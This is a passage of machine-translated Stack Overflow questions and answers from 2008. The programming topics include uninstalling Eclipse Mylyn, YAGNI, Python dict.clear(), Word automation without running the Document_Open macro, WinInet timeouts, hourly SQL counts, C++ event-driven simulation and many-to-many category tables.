*.mylyn.commons.ui_*
*.mylyn.commons.workbench_*
*.mylyn.commons.wikitext.markdown_*
*.mylyn.commons.wikitext.* 
```

请注意，这适用于相当新的*Eclipse 2021-03 (4.19.0)*安装。它可能与另一个版本不同——甚至是补丁版本。

此外：

*   保持 Eclipse 的*错误日志*视图打开一段时间。如果第一次从其他捆绑包（插件）引用捆绑包（插件），则底层 OSGi 会即时激活捆绑包（插件）。如果一个人不在，那么...

*   检查*错误日志*视图，尤其是在安装新功能/插件之后。他们可能依赖于您移至`.DISABLED`. 如果是这种情况，请将相应的 JAR 移回`ECLIPSE_HOME/plugins`和/或`ECLIPSE_HOME/features`.

*   如果将来某事不能像过去那样工作，请记住您所做的并... →*错误日志*视图。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-21T00:59:35.660

我正在运行（相对较新的）3.4.1。我能够选择屏幕截图中显示的相同插件（Mylyn Bridge：Java Development）来获得启用的“卸载...”按钮。我建议获取最新更新并重试。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-06-12T16:09:32.963

看起来确实没有办法做到这一点。

我刚刚下载了 Eclipse Java IDE (Ganymede SR2) 就遇到了这个问题。我不想要 Mylyn，但我也不想要“Eclipse Classic”，因为下载的大小是原来的两倍，我猜是因为它包含源代码。

显而易见的解决方案是更新所有内容并重新启动 Eclipse，然后为 Mylyn 插件启用“卸载...”按钮。不幸的是，这只卸载了最新的更新版本（3.0.11 IIRC），恢复到不可卸载的 3.0.5。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2011-03-11T02:57:56.843

> > 我只是不知道这些 Eclipse 开发人员到底在想什么！自从 Helios 以来，从 Eclipse 中删除插件就成了一件令人头疼的事情！

我听到你的朋友......我只是花了一整天的时间试图弄清楚，因为似乎没有人给出像“做这个，那个，完成”这样的直接答案。伙计，我宁愿编程......

发现，在我半夜，可以卸载几乎所有东西。问题是该死的东西隐藏在“帮助->关于”中。谁会在一遍又一遍地通过“帮助->安装新软件”或“帮助->检查更新”并且从未找到诸如“删除”或“重新安装”或“强制重新安装”之类的东西之后猜测。说真的，我宁愿回到 1990 年，那时我们有微软、Borland 和 Watcom。你选择了你的平台，你将与世界 1/3 的开发者在一起。好吧，也许 Watcom 没有成功那个标记，但你明白了。

所以...要从 Eclipse Helios（Service Release 1）或 Springsource 3.5.2（或我正在使用的 3.6.1）卸载任何插件，请执行以下操作：

1.  关闭所有项目（只是为了安全起见）；
2.  点击菜单“帮助-->关于”（是的..帮助，关于）；
3.  点击“安装详细信息”按钮，您将获得所有插件的列表；
4.  单击要删除的那个；点击卸载；
5.  如果要删除多个，只需应用更改而无需重新启动；
6.  根据需要转到 4)
7.  最后，重启 Eclipse 并重新安装你需要的东西！

很难找到，但对我来说效果很好。

# unit-testing - YAGNI - 不能命名的敏捷实践？

> ID：369897
> 
> 赞同：16
> 
> 时间：2008-12-15T22:23:04.843
> 
> 标签：unit-testing, agile, extreme-programming, yagni

随着我越来越多地将敏捷思维吸收到我的工作方式中，yagni（“你不会需要它”）似乎变得越来越重要。在我看来，这似乎是过滤掉被误导的优先事项并决定下一步*不做*什么的最有效规则之一。

然而，yagni 似乎是一个在 SO 中几乎没有被提及的概念。我进行了强制性搜索，它只出现在一个问题标题中——然后是次要角色。

为什么是这样？我是否高估了它的重要性？

免责声明。为了抢占响应，我相信我会反对，让我强调一下 yagni 是**quick-and-dirty 的对立面**。它鼓励您将宝贵的时间和精力集中在获得您确实需要的零件上。

以下是人们可能会提出的一些热门问题。

我的单元测试是根据用户要求还是框架结构选择的？

我是否安装（并测试和维护）单元测试，因为它们脱离了框架？

有多少由我的框架生成的代码我从未看过（但总有一天可能会咬我，即使是 yagni）？

我花了多少时间在我的工具上而不是用户的问题上？

结对编程时，观察者的角色价值往往在于“yagni”。

你使用 CRUD 工具吗？它是否允许（不，鼓励）您将其用作 _RU_ 工具或 C__D 工具，或者当您只需要一两个代码时，您是否正在创建四段代码（加上四个单元测试）？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-12-15T22:32:37.697

TDD 在某种程度上包含了 YAGNI。如果您正确地进行 TDD，即只编写那些产生所需功能的测试，然后开发最简单的代码以通过测试，那么您默认遵循 YAGNI 原则。根据我的经验，只有当我跳出 TDD 框框并开始在测试之前编写代码、测试我并不真正需要的东西或代码不是通过测试的最简单方法时，我才违反了 YAGNI .

以我的经验，后者是我在做 TDD 时最常见的错误——我倾向于向前跳并开始编写代码以通过下一个测试。这通常会导致我基于我的代码而不是需要测试的要求有一个先入为主的想法，从而损害剩余的测试。

YMMV。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T22:46:04.970

Yagni 和 KISS（保持简单，愚蠢）本质上是相同的原则。不幸的是，我看到 KISS 被提到的频率和我看到“yagni”一样频繁。

在我的荒野中，项目延迟和失败的最常见原因是不必要的组件执行不力，所以我同意你的基本观点。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-12T19:44:50.127

**改变的自由推动了 YAGNI**。在瀑布项目中，口头禅是控制范围。通过与客户签订合同来控制范围。因此，客户将他们能想到的所有东西都塞进范围文档中，因为他们知道一旦签订合同就很难改变范围。结果，您最终得到的应用程序具有一长串功能，而不是一组有价值的功能。

通过敏捷项目，产品负责人构建了一个优先的产品待办事项列表。开发团队根据优先级（即价值）构建功能。结果，最重要的东西首先被构建。您最终会得到一个具有用户重视的功能的应用程序。不重要的事情会从列表中消失或没有完成。那是雅格尼。

While YAGNI is not a practice, it is a result of the prioritized backlog list. The business partner values the flexibility afforded the business given that they can change and reprioritized the product backlog from iteration to iteration. It is enough to explain that YAGNI is the benefit gained when we readily accept change, even late in the process.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-17T23:16:58.057

我发现的问题是，人们甚至倾向于使用 YAGNI 下的 DI 容器（除非你的代码库中已经有它）来编写工厂。我同意那里的JB King。对于我与 YAGNI 合作过的许多人来说，似乎是偷工减料/编写草率代码的许可。

例如，我正在编写一个用于抽象多个模型/制造商的 PINPad 的 PinPad API。我发现除非我有整体结构，否则我什至无法编写单元测试。可能我不是一个非常老练的 TDD 实践者。我敢肯定我所做的是否是 YAGNI 会有不同的意见。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T22:33:48.037

我看过很多关于 SO 引用过早优化的帖子，这是 yagni 的一种形式，或者至少是 ydniy（你还不需要它）。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-12-17T22:39:37.603

我不认为 YAGNI 是快速和肮脏的对立面，真的。它只是做需要做的事情，而不是像某人编写的软件那样计划必须持续 50 年。它可能很少出现，因为至少在我看来，围绕它的问题并不多。类似于“不要重复自己”和“保持简单、愚蠢”的规则，这些规则变得很普遍，但不一定以 101 种方式进行剖析和分析。有些事情很简单，通常在做一些练习后很快就会得到。有些事情是在幕后发展起来的，如果你转身看你可能会注意到它们可能是另一种陈述事情的方式。

# python - Python 中 dict.clear() 和分配 {} 的区别

> ID：369898
> 
> 赞同：180
> 
> 时间：2008-12-15T22:23:18.680
> 
> 标签：python, dictionary

`clear()`在python中，调用和分配`{}`给字典有区别吗？如果是，那是什么？例子：

```
d = {"stuff":"things"}
d.clear()   #this way
d = {}      #vs this way 
```

* * *

## 回答 #1

> 赞同：303
> 
> 时间：2008-12-15T22:30:29.463

如果您有另一个变量也引用同一字典，则存在很大差异：

```
>>> d = {"stuff": "things"}
>>> d2 = d
>>> d = {}
>>> d2
{'stuff': 'things'}
>>> d = {"stuff": "things"}
>>> d2 = d
>>> d.clear()
>>> d2
{} 
```

这是因为分配`d = {}`创建了一个新的空字典并将其分配给`d`变量。这留下`d2`了指向旧字典，其中仍有项目。但是，`d.clear()`清除`d`和`d2`都指向的同一个字典。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2008-12-15T22:32:02.907

`d = {}`将创建一个新实例，`d`但所有其他引用仍将指向旧内容。 `d.clear()`将重置内容，但对同一实例的所有引用仍然是正确的。

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2008-12-16T11:31:10.790

除了其他答案中提到的差异之外，还存在速度差异。d = {} 快两倍多：

```
python -m timeit -s "d = {}" "for i in xrange(500000): d.clear()"
10 loops, best of 3: 127 msec per loop

python -m timeit -s "d = {}" "for i in xrange(500000): d = {}"
10 loops, best of 3: 53.6 msec per loop 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2011-12-08T08:34:25.803

作为前面已经提到的事情的说明：

```
>>> a = {1:2}
>>> id(a)
3073677212L
>>> a.clear()
>>> id(a)
3073677212L
>>> a = {}
>>> id(a)
3073675716L 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-12-25T08:41:33.207

除了@odano 的回答，`d.clear()`如果您想多次清除字典，似乎使用速度更快。

```
import timeit

p1 = ''' 
d = {}
for i in xrange(1000):
    d[i] = i * i
for j in xrange(100):
    d = {}
    for i in xrange(1000):
        d[i] = i * i
'''

p2 = ''' 
d = {}
for i in xrange(1000):
    d[i] = i * i
for j in xrange(100):
    d.clear()
    for i in xrange(1000):
        d[i] = i * i
'''

print timeit.timeit(p1, number=1000)
print timeit.timeit(p2, number=1000) 
```

结果是：

```
20.0367929935
19.6444659233 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2015-11-25T10:27:12.553

*如果原始对象不在范围内，*变异方法总是有用的：**

 *```
def fun(d):
    d.clear()
    d["b"] = 2

d={"a": 2}
fun(d)
d          # {'b': 2} 
```

重新分配字典将创建一个新对象，并且不会修改原始对象。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-08-26T01:53:11.040

没有提到的一件事是范围问题。不是一个很好的例子，但这是我遇到问题的情况：

```
def conf_decorator(dec):
    """Enables behavior like this:
        @threaded
        def f(): ...

        or

        @threaded(thread=KThread)
        def f(): ...

        (assuming threaded is wrapped with this function.)
        Sends any accumulated kwargs to threaded.
        """
    c_kwargs = {}
    @wraps(dec)
    def wrapped(f=None, **kwargs):
        if f:
            r = dec(f, **c_kwargs)
            c_kwargs = {}
            return r
        else:
            c_kwargs.update(kwargs) #<- UnboundLocalError: local variable 'c_kwargs' referenced before assignment
            return wrapped
    return wrapped 
```

解决方案是替换`c_kwargs = {}`为`c_kwargs.clear()`

如果有人想出一个更实际的例子，请随时编辑这篇文章。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2017-07-03T11:47:11.387

此外，有时 dict 实例可能是 dict 的子类（`defaultdict`例如）。在这种情况下，`clear`最好使用 using，因为我们不必记住 dict 的确切类型，也可以避免重复代码（将清除行与初始化行耦合）。

```
x = defaultdict(list)
x[1].append(2)
...
x.clear() # instead of the longer x = defaultdict(list) 
```

# ms-word - 如何在不调用 Document_Open 宏的情况下以编程方式打开 MS Word 文档

> ID：369900
> 
> 赞同：1
> 
> 时间：2008-12-15T22:24:21.707
> 
> 标签：ms-word, office-automation

我正在尝试使用 Office 自动化打开 Word 文档。问题是我想在不调用 Document_Open 宏的情况下打开它。有没有办法做到这一点？

下面的相关行是 wordApp.Documents.Open()

```
Imports Microsoft.Office.Interop

Public Class WordFunctions
  Public Shared Function ConvertToDoc(ByVal file As String) As Boolean
    Dim wordDoc As Word.Document
    Dim wordApp As Word.Application

    Try
        wordApp = CreateObject("Word.Application", "")
    Catch ex As Exception
        Return False
    End Try

    Try
        wordApp.Caption = "Automated Word Instance"
        wordApp.DisplayAlerts = Word.WdAlertLevel.wdAlertsNone
        wordDoc = wordApp.Documents.Open(FileName:=file, Visible:=False, ConfirmConversions:=False)

        wordDoc.SaveAs(FileName:=file + ".doc", FileFormat:=Word.WdSaveFormat.wdFormatDocument)
        wordDoc.Activate()
        wordDoc.Close()
        Return True
    Catch ex As Exception
        Return False
    Finally
        wordApp.Quit(SaveChanges:=False)
    End Try
  End Function
End Class 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-15T22:30:34.783

如果您使用的是 Word 2007 文档，请尝试更改您的代码以直接使用 XML，而不是使用 Office 自动化 API。

它更快，您不必担心宏（以及许多其他自动化问题）。

# winapi - WinInet：FTP put 中的超时管理

> ID：369905
> 
> 赞同：2
> 
> 时间：2008-12-15T22:25:10.957
> 
> 标签：winapi, ftp, wininet

我的程序使用 HTTP 将文件放入远程主机。由于一些不可避免的原因，远程主机需要一些时间来确认数据传输的最终数据包。比默认超时时间更长，根据我的经验，默认超时时间约为 30 秒。因此，我想使用以下代码将超时时间增加到 5 分钟：

```
DWORD dwTimeout= 300000; // 5 minutes
pFtpConnection->SetOption( // KB176420: this has no effect on some
  INTERNET_OPTION_SEND_TIMEOUT, dwTimeout); // old versions of IE.
pFtpConnection->SetOption(
  INTERNET_OPTION_RECEIVE_TIMEOUT, dwTimeout);
pFtpConnection->SetOption( // NB: Docs say these 2 are not implemented.
  INTERNET_OPTION_DATA_SEND_TIMEOUT, dwTimeout); 
pFtpConnection->SetOption( // our own tests show that they are!
  INTERNET_OPTION_DATA_RECEIVE_TIMEOUT, dwTimeout); 
```

这是归结为调用的 MFC 代码

```
InternetOption(hConnection, INTERNET_XXX, &dwTimeout, sizeof(dwTimeout)) 
```

问题是该代码显然无法修改使用该程序的计算机的不可忽略比例的超时。

如何可靠地设置数据连接超时？

TIA,

塞尔吉·沃蒂尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-11-02T07:51:16.933

看起来这个 WinInet 问题无法可靠地解决。

我最终从 WinInet 切换到[Ultimate TCP/IP](http://www.codeproject.com/KB/MFC/UltimateTCPIP.aspx)。

# sql - 以每天、每小时的方式收集数据的 SQL 语句

> ID：369908
> 
> 赞同：2
> 
> 时间：2008-12-15T22:25:29.800
> 
> 标签：sql

我有一个数据库，每天更新 200-1000 行新行。现在，我想要一个 SQL 语句，它每天、每小时地返回数据，这样我就可以粗略估计当前趋势，即今天将向数据库添加多少行，只需快速浏览一下这些历史图表。

所以，假设我想打印过去 10 天的 10 个图表，每小时汇总一次数据，例如：

Day9:21,24,15,18,...,30,28,25 ：总共 348 行（第 9 天每小时行数和总数） Day8:32,37,38,43,...,45 ,55,65：tot 442（第 8 天的每小时行数和总数）... ... Day0:18,25,28,X,Y...：tot 'S'（今天的统计数据）远。S会是什么？）

SQL 语句将如何以这种每天、每小时的方式收集数据？

为了粗略估计今天的总“S”，而不是直观地查看图表，更好的是计算“S”的预测。但我猜这将是一个完全不同的问题......任何关于如何做到这一点的提示或我可以获得更多信息的提示将不胜感激！

谢谢，/汤米

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T22:32:37.540

嗯，根据你的数据库引擎，你会得到不同的结果，但是对于 PostgreSQL，我会做这样的事情：

```
SELECT date_trunc('hour', table.date), count(table.id)
FROM table
GROUP BY date_trunc('hour', table.date)
ORDER BY date_trunc('hour', table.date) 
```

该[`date_trunc`](http://www.postgresql.org/docs/8.3/static/functions-datetime.html)函数将时间戳字段截断到某个点。该查询将每小时向您返回查询的数量，您只需在软件中计算总和即可。

如果你真的想让 SQL 查询准确地返回你想要的，我认为你必须创建一个函数返回一个带有正确数据的 sql 集，但我认为在你的代码中更容易做到这一点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-16T19:46:05.113

MySQL 有一堆日期/时间函数......您可能正在寻找 HOUR(date) 作为 PostGreSQL 中的 date_trunc('hour', date) 的等价物。

所以，如果你想要按天和按小时...

```
SELECT Day(theDate), Hour(theDate), COUNT(1)
FROM theTable
WHERE ....
GROUP BY Day(theDate), Hour(theHour)
ORDER BY Day(theDate), Hour(theHour) 
```

它会给你这样的行：

```
Day,Hour,Count
1,0,102
1,1,133
...
10,22,47
10,23,384 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-07-02T20:23:21.247

我有类似的情况，使用Oracle。对于名为**reporting_data**的表，我想要一个查询，它可以告诉我每小时插入了多少条记录，以及以 10 分钟为增量插入了多少条记录。

每小时很容易：

```
 SELECT TO_CHAR(TRUNC(r.creation_date, 'HH'), 'DD-MON-YYYY HH24:MI:SS'),
         COUNT (*)
    FROM reporting_data r
   WHERE r.creation_date > TO_DATE ('27-OCT-2008', 'dd - mon - yyyy')
     AND r.creation_date < TO_DATE ('28-OCT-2008', 'dd - mon - yyyy')
GROUP BY TO_CHAR (TRUNC (r.creation_date, 'HH'), 'DD-MON-YYYY HH24:MI:SS')
ORDER BY TO_CHAR (TRUNC (r.creation_date, 'HH'), 'DD-MON-YYYY HH24:MI:SS') ASC 
```

**该查询将根据creation_date**列返回 10 月 27 日至 10 月 28 日之间的所有记录的计数，每小时细分。

以 10 分钟的增量而不是每小时的增量来分解它有点困难，但通过一些操作它是可行的。

```
SELECT   SUBSTR(TO_CHAR(r.creation_date, 'DD-MON-YYYY HH24:MI:SS'), 1, 16) || '0:00',
         COUNT (*)
    FROM reporting_data r
   WHERE r.creation_date > TO_DATE ('27-OCT-2008', 'DD-MON-YYYY')
     AND r.creation_date < TO_DATE ('28-OCT-2008', 'DD-MON-YYYY')
GROUP BY SUBSTR (TO_CHAR (r.creation_date, 'DD-MON-YYYY HH24:MI:SS'), 1, 16) || '0:00' 
```

那里有很多字符串操作，所以它可能不是最高效的方式。在超过 25,000,000 行的表上，执行大约需要一分钟。（再说一次，在同一张表上执行 SELECT COUNT(*) 也需要大约 30 秒，所以除了查询之外可能还有其他问题。）

# serialization - 将 java Map 序列化到数据库

> ID：369916
> 
> 赞同：0
> 
> 时间：2008-12-15T22:28:59.420
> 
> 标签：serialization

我正在使用 jdbc 来处理我的数据库。我想将 HashMap 直接存储在数据库 oracle 中。我想我需要序列化地图及其内容，它们只是字符串。Map 已经实现了 Serializeable，但我的问题是如何使用 jdbc 将 Map 放入 SQL 中？例如，我有一个 jdbcTemplate.update("insert into ....", new Object[]{....}, new int[]{....}) 我只是将 Map 放入 Object大批？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T22:55:34.327

您需要一个包含键/值列的表，并且如果您要存储多个映射，则需要一个标识列（或另一个表的外键，该表包含哈希映射所属的数据）。

然后在 JDBC 中，创建一个预处理语句（插入 myhashmap (id, foreign_id, key, val) 值 (?, ?, ?, ?)）ONCE，然后遍历 hashmap 中的每个元素，在语句上设置参数并在查询上调用执行。

（对不起，附近没有任何代码可以发布代码片段并且不想输入错误的示例）。

这也可以简单地扩展到 String -> Object 的映射，您希望将每个字段存储在 DB 中的 Object 中。即，它基本上就像数据库中的标准表和“键”列。列表类似，但有一个“排名”列来指示排序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T22:45:09.387

我过去的做法是在表中创建一列来存储您的序列化对象。数据类型在 Oracle 中应该是“blob”或等效的。

然后可以使用 ResultSet.setBytes() 和 ResultSet.getBytes() 写入/检索它

# clojure - Clojure 中 Common Lisp 的符号名称？

> ID：369939
> 
> 赞同：10
> 
> 时间：2008-12-15T22:37:05.377
> 
> 标签：clojure, common-lisp

Clojure 中是否有与 Common Lisp 的 `symbol-name`功能等价的东西？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-15T22:44:24.020

Clojure 名称函数将返回符号的名称，而不是符号本身。

```
(name symbol) 
```

[Stuart Sierra 在 Clojure 组上的回答。](http://groups.google.com/group/clojure/browse_thread/thread/a0776bc5805a5137)

# vm-implementation - 简单的解释语言设计与实现

> ID：369940
> 
> 赞同：0
> 
> 时间：2008-12-15T22:37:11.460
> 
> 标签：vm-implementation, interpreted-language

我需要一些资源来实现一个简单的虚拟机和解释语言。实用的东西是最有用的。我看过虚拟机实现这本书，发现它很旧，并不代表我今天看到的虚拟机。此外，如果有人知道一种相当简单的语言，那也很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T22:45:30.370

检查[Lua 5.0 的实现](http://www.tecgraf.puc-rio.br/~lhf/ftp/doc/jucs05.pdf)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T04:38:10.750

您不会说这是针对新项目、与现有项目一起工作、学习或您正在使用的目标环境、语言和操作系统。

如果您想了解如何实现自己的 VM 和脚本语言，请阅读[Game Scripting Mastery](https://rads.stackoverflow.com/amzn/click/com/1931841578)。尽管它的标题，它实际上是关于实现你自己的虚拟机和脚本语言。源代码适用于 Win32，但这些概念可以应用于 .Net 或 Linux。

作为奖励，当您完成后，您将拥有一个可玩的、可编写脚本的 2D 冒险游戏。

# c++ - 事件驱动模拟类

> ID：369948
> 
> 赞同：3
> 
> 时间：2008-12-15T22:42:25.023
> 
> 标签：c++, simulation, event-driven

我正在完成 Bjarne Stroustrup 在 The C++ Programming Language 中的一些练习。我对第 12 章末尾的问题 11 感到困惑：

> (*5) 设计并实现一个用于编写事件驱动模拟的库。提示：<task.h>。...类任务的对象应该能够保存其状态并恢复该状态，以便它可以作为协程运行。特定任务可以定义为从任务派生的类的对象。一个任务要执行的程序可能被定义为一个虚函数。...应该有一个调度程序实现虚拟时间的概念。...任务需要沟通。为此设计一个班级队列。...

我不确定这到底是什么要求。任务是一个单独的线程吗？（据我所知，没有系统调用就不可能创建一个新线程，而且由于这是一本关于 C++ 的书，我不相信这是意图。）没有中断，如何启动和停止运行功能？我认为这将涉及忙等待（也就是说，不断循环并检查条件），尽管我看不出如何将其应用于可能在一段时间内不会终止的函数（例如，如果它包含无限循环） .

**编辑：**请在下面查看我的帖子以获取更多信息。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-16T01:20:37.030

这是我对“事件驱动模拟”的理解：

*   控制器处理事件队列，安排事件在特定时间发生，然后执行队列中的顶部事件。
*   事件在预定时间瞬间发生。例如，“移动”事件将更新模拟中实体的位置和状态，以使状态向量在当前模拟时间有效。“感知”事件必须确保所有实体的状态都在当前时间，然后使用一些数学模型来评估当前实体对其他实体的感知能力。（想想机器人在板上移动。）
*   因此，时间是不连续的，从一个事件跳到另一个事件。将此与时间驱动的仿真进行对比，其中时间以离散的步长移动，并且所有实体的状态在每个时间步长（大多数 Simulink 模型）都会更新。
*   然后事件可以按其自然速率发生。在模拟中以最佳速率重新计算所有数据通常没有意义。

大多数生产事件驱动的模拟在单线程中运行。它们本质上可能很复杂，因此尝试同步多线程模拟往往会增加指数层的复杂性。[话虽如此，有一个称为分布式交互式模拟](http://en.wikipedia.org/wiki/Distributed_Interactive_Simulation)（DIS）的多进程军事模拟标准，它使用预定义的 TCP 消息在进程之间传输数据。

编辑：定义建模和仿真之间的区别很重要。模型是系统或过程的数学表示。模拟是从一个或多个在一段时间内执行的模型构建的。同样，事件驱动的模拟从一个事件跳到另一个事件，而时间驱动的模拟以恒定的时间步长进行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-16T00:25:11.743

> 提示：<task.h>。

[是对早期版本的 CFront](http://www.softwarepreservation.org/projects/c_plus_plus#release_e)附带的旧协作式多任务库的引用（您也可以在该页面下载）。

如果您阅读论文“ [A Set of C++ Classes for Co-routine Style Programming](http://www.softwarepreservation.org/projects/c_plus_plus/cfront/release_e/doc/ClassesForCouroutines.pdf) ”，事情会变得更有意义。

* * *

补充一点：

我不是一个使用任务库的足够老的程序员。但是，我知道 C++ 是在 Stroustrup 在 Simula 中编写了一个模拟后设计的，该模拟具有许多与任务库相同的属性，所以我一直对它很好奇。

如果我要实现书中的练习，我可能会这样做（请注意，我没有测试过这段代码，甚至没有尝试编译它）：

```
class Scheduler {
    std::list<*ITask> tasks;
  public:
    void run()
    {
        while (1) // or at least until some message is sent to stop running
            for (std::list<*ITask>::iterator itor = tasks.begin()
                      , std::list<*ITask>::iterator end = tasks.end()
                    ; itor != end
                    ; ++itor)
                (*itor)->run(); // yes, two dereferences
    }

    void add_task(ITask* task)
    {
        tasks.push_back(task);
    }
};

struct ITask {
    virtual ~ITask() { }
    virtual void run() = 0;
}; 
```

我知道人们会不同意我的一些选择。例如，为接口使用结构；但是结构的行为默认情况下从它们继承是公共的（默认情况下从类继承是私有的），并且我看不到从接口私有继承的任何价值，那么为什么不将公共继承设为默认值呢？

这个想法是，对 ITask::run() 的调用将阻塞调度程序，直到任务到达可以中断的点，此时任务将从 run 方法返回，并等待调度程序再次调用 run继续。“cooperative multitasking”中的“cooperative”是指“任务说什么时候可以被中断”（“coroutine”通常是指“cooperative multitasking”）。一个简单的任务可能只在它的 run() 方法中做一件事，一个更复杂的任务可能会实现一个状态机，并可能使用它的 run() 方法来确定对象当前处于什么状态，并根据它调用其他方法在那个状态。任务**必须**偶尔放弃控制以使其发挥作用，因为这就是“合作多任务”的定义。这也是所有现代操作系统不使用协作多任务处理的原因。

此实现不（1）遵循公平调度（可能保持在任务的 run() 方法中花费的时钟滴答总数，并跳过相对于其他任务使用太多时间的任务，直到其他任务“赶上”） , (2) 允许删除任务，甚至 (3) 允许停止调度程序。

至于任务之间的通信，您可以考虑查看[Plan 9 的 libtask](http://swtch.com/libtask/)或[Rob Pike 的 newsqueak](http://herpolhode.com/rob/)以获得灵感（“Newsqueak 的 UNIX 实现”下载包括一篇论文“Newsqueak 的实现”，该论文讨论了有趣的虚拟机中的消息传递）。

但我相信这是 Stroustrup 心目中的基本骨架。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T23:14:27.533

在我看来，这个练习要求你实现一个协作式多任务调度程序。调度程序以虚拟时间运行（您定义/实现的任何级别的时间滴答），根据队列选择要运行的任务（请注意，您需要实现的描述）以及当前任务何时运行完成后，调度程序选择下一个并开始运行。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-17T14:15:52.847

离散事件模拟的通用结构基于以时间值为键的优先级队列。在广义上它是这样的：

```
    虽然（不是结束条件）：
        从优先级队列中弹出下一个事件（时间最短的事件）
        处理该事件，这可能会产生更多事件
        如果生成新事件：
            将其放置在其生成时间键控的优先级队列中

```

协同程序将模型的视图从以事件为中心变为以实体为中心。实体可以经历一些生命周期（例如接受作业、获取资源 X、处理作业、释放资源 X、将作业放入队列以进行下一步）。这更容易编程，因为抓取资源是使用类似信号量的同步原语处理的。作业和同步原语在幕后生成事件并将它们排队。

这给出了一个在概念上类似于操作系统中的进程的模型，并且当进程的输入或它所请求的共享资源可用时，调度程序唤醒进程。协程模型使仿真更容易理解，这对于仿真复杂系统很有用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T22:47:31.580

（我不是 C++ 开发人员）

可能这意味着您需要创建一个类 Task（如在 Event 中），该类主要由回调函数指针和预定时间组成，并且可以存储在 Scheduler 类的列表中，而后者基本上应该保留跟踪计时器并在时间到达时调用每个任务的函数。这些任务应该由模拟的对象创建。

如果您在离散模拟方面需要帮助，请继续编辑问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-16T13:14:29.617

这是对 Titandecoy 对 SottieT812 回答的评论的回应。它对于评论来说太大了，所以我决定让它成为另一个答案。

从某种意义上说，它是事件驱动的，模拟状态仅响应事件而改变。例如，假设您有两个事件*导弹发射*和*导弹撞击*。当*启动*事件执行时，它会计算出影响的时间和地点，并在适当的时间安排*影响*事件。导弹的位置不是在发射和撞击之间计算的，尽管它可能会有一个方法可以被其他对象调用以获取特定时间的位置。

这与时间驱动的模拟形成对比，其中导弹（以及模拟中的每个其他对象）的确切位置是在每个时间步长之后计算的，比如 1 秒。

根据模型的特性、所需答案的保真度以及许多其他因素，事件驱动或时间驱动的仿真可能会表现得更好。

编辑：如果有人有兴趣了解更多信息，请查看[冬季模拟会议的论文](http://wintersim.org/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-17T13:37:23.127

有一本书和名为[DEMOS](http://www.dcs.shef.ac.uk/~graham/research/demos.pdf)（Simula 上的离散事件建模）的框架描述了一个基于协程的框架（同名的 DEMOS）。尽管已经 30 岁左右，DEMOS 实际上是一个相当不错的系统，而[Graham Birtwistle](http://www.dcs.shef.ac.uk/~graham/)是一个非常好的人。

如果你在 C++ 上实现协同例程（想想 setjump/longjump），你应该看看这本书，了解一个*非常非常优雅*的离散事件建模框架。虽然它已经 30 年了，但它有点永恒的经典，并且仍然拥有粉丝群。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-16T03:28:41.653

在“me.yahoo.com/...”链接的论文中，描述了 task.h 类：

1.  任务并行执行
2.  任务可能会暂停并稍后恢复

该库被描述为一种多道程序设计方法。

**是否可以在不使用线程或单独进程的情况下做到这一点？**

# php - 来自多个类别的项目最佳实践

> ID：369965
> 
> 赞同：3
> 
> 时间：2008-12-15T22:46:41.707
> 
> 标签：php, sql, mysql, zend-framework, join

我正在制作类别中的项目列表，问题是项目可以属于多个类别。您将项目存储在类别中的最佳做法是什么？如何列出类别及其子类别中的所有项目？我正在使用 Zend Framework 和 MySQL 来解决这个问题。

感谢您的回复。

对不起我的英语不好 ：）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-15T22:53:55.267

所以，你在类别中有一个层次结构，是吗？它是一个级别（类别和子类别）还是任何数量（孩子可以有孩子等）？这将影响解决方案是什么。

一般来说，你会用多对多关系来建模这样的东西，比如：

```
CREATE TABLE Item(
  item_id INT NOT NULL, 
  item_name VARCHAR(255) NOT NULL
)
CREATE TABLE Category(
  category_id INT NOT NULL, 
  category_name VARCHAR(255) NOT NULL
)
CREATE TABLE Item_Category(
  item_id INT NOT NULL REFERENCES Item(item_id), 
  category_id INT NOT NULL REFERENCES Category(category_id)
 ) 
```

“Item_Category”中的记录意味着列出的项目在列出的类别中。然后，您可以在这些表中的 2 个（或 3 个）之间进行连接，以列出哪些项目属于哪些类别：

```
SELECT I.* 
  FROM Item I 
    INNER JOIN Item_Category IC ON I.item_id = IC.item_id 
    INNER JOIN Category C on IC.category_id = C.category_id 
  WHERE 
    C.category_name = 'MyCategory' 
```

或者一个项目有哪些类别：

```
SELECT C.*
  FROM Category C
    INNER JOIN Item_Category IC.category_id = C.category_id 
    INNER JOIN Item I on IC.item_id = I.item_id
